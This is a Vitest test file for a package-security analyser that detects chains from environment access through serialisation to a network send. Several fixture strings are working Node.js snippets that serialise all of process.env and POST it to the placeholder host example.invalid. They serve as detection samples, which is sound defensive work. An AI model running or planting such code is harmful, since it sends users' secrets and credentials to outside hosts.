import { describe, expect, it } from "vitest";
import { BehaviourChainSchema } from "@packagegate/shared";
import { analyseFile } from "@packagegate/static-analyser";
import { analyseBehaviourChains } from "./analyse.js";
import { ENGINE_VERSION } from "./version.js";

const EXFIL_SAMPLE = [
  `const https = require("https");`,
  `const payload = JSON.stringify(process.env);`,
  `const req = https.request({ hostname: "example.invalid", method: "POST" });`,
  `req.end(payload);`,
  ``,
].join("\n");

const UNRELATED_SAMPLE = [
  `const x = process.env.NODE_ENV;`,
  `https.request({ hostname: "example.com" });`,
  ``,
].join("\n");

const DIRECT_SERIALIZE_SAMPLE = [
  `const https = require("https");`,
  `const req = https.request({ hostname: "example.invalid", method: "POST" });`,
  `req.end(JSON.stringify(process.env));`,
  ``,
].join("\n");

const BINDING_PROPAGATION_SAMPLE = [
  `const https = require("https");`,
  `const marker = process.env.NODE_ENV;`,
  `const env = process.env;`,
  `const payload = JSON.stringify(env);`,
  `const req = https.request({ hostname: "example.invalid", method: "POST" });`,
  `req.end(payload);`,
  ``,
].join("\n");

function analyseWithFindings(path: string, content: string) {
  const fileAnalysis = analyseFile({ path, content });
  return analyseBehaviourChains({
    files: [{ path, content }],
    findings: fileAnalysis.findings,
  });
}

describe("analyseBehaviourChains", () => {
  it("reports engine version", () => {
    const result = analyseWithFindings("index.js", UNRELATED_SAMPLE);
    expect(result.engineVersion).toBe(ENGINE_VERSION);
  });

  it("detects ENVIRONMENT → JSON_SERIALIZATION → NETWORK_REQUEST chain", () => {
    const result = analyseWithFindings("exfil.js", EXFIL_SAMPLE);

    expect(result.chains.length).toBeGreaterThanOrEqual(1);

    const chain = result.chains.find(
      (candidate) =>
        candidate.source === "ENVIRONMENT_ACCESS" &&
        candidate.transformations.includes("JSON_SERIALIZATION") &&
        candidate.sink === "NETWORK_REQUEST",
    );

    expect(chain).toBeDefined();
    expect(chain?.metadata.pattern).toBe("J1");
    expect(chain?.links.length).toBeGreaterThanOrEqual(2);
    expect(
      chain?.links.some(
        (link) => link.kind === "SHARED_BINDING" || link.kind === "ARGUMENT_FLOW",
      ),
    ).toBe(true);
    expect(chain?.links.some((link) => link.kind === "SEQUENTIAL_IN_SCOPE")).toBe(false);
    expect(chain?.supportingFindingIds.length).toBeGreaterThan(0);
    expect(BehaviourChainSchema.safeParse(chain).success).toBe(true);
  });

  it("does not chain unrelated env read and network call", () => {
    const result = analyseWithFindings("benign.js", UNRELATED_SAMPLE);
    expect(result.chains).toEqual([]);
  });

  it("detects direct JSON.stringify(process.env) passed to req.end", () => {
    const result = analyseWithFindings("direct.js", DIRECT_SERIALIZE_SAMPLE);

    expect(result.chains.length).toBeGreaterThanOrEqual(1);
    const chain = result.chains[0];
    expect(chain?.transformations).toContain("JSON_SERIALIZATION");
    expect(chain?.sink).toBe("NETWORK_REQUEST");
    expect(chain?.links.every((link) => link.kind !== "SEQUENTIAL_IN_SCOPE")).toBe(true);
  });

  it("tracks env binding through serialization to network sink", () => {
    const result = analyseWithFindings("propagate.js", BINDING_PROPAGATION_SAMPLE);

    expect(result.chains.length).toBeGreaterThanOrEqual(1);
    const chain = result.chains[0];
    expect(chain?.links.some((link) => link.kind === "SHARED_BINDING")).toBe(true);
    expect(chain?.transformations).toContain("JSON_SERIALIZATION");
  });

  it("skips files missing source or sink findings", () => {
    const result = analyseBehaviourChains({
      files: [{ path: "empty.js", content: "export {};\n" }],
      findings: [],
    });
    expect(result.chains).toEqual([]);
  });

  it("skips files without matching content", () => {
    const findings = analyseFile({ path: "missing.js", content: EXFIL_SAMPLE }).findings;
    const result = analyseBehaviourChains({
      files: [],
      findings,
    });
    expect(result.chains).toEqual([]);
  });
});

describe("chain evidence quality", () => {
  it("caps confidence using maxConfidenceForLinks semantics", () => {
    const result = analyseWithFindings("exfil.js", EXFIL_SAMPLE);
    const chain = result.chains[0];
    expect(chain?.confidence).toBe("HIGH");
  });

  it("records link locations a reviewer can verify", () => {
    const result = analyseWithFindings("exfil.js", EXFIL_SAMPLE);
    const chain = result.chains[0];
    for (const link of chain?.links ?? []) {
      expect(link.location.filePath).toBe("exfil.js");
      expect(link.location.startLine).toBeGreaterThan(0);
      expect(link.description.length).toBeGreaterThan(0);
    }
  });
});
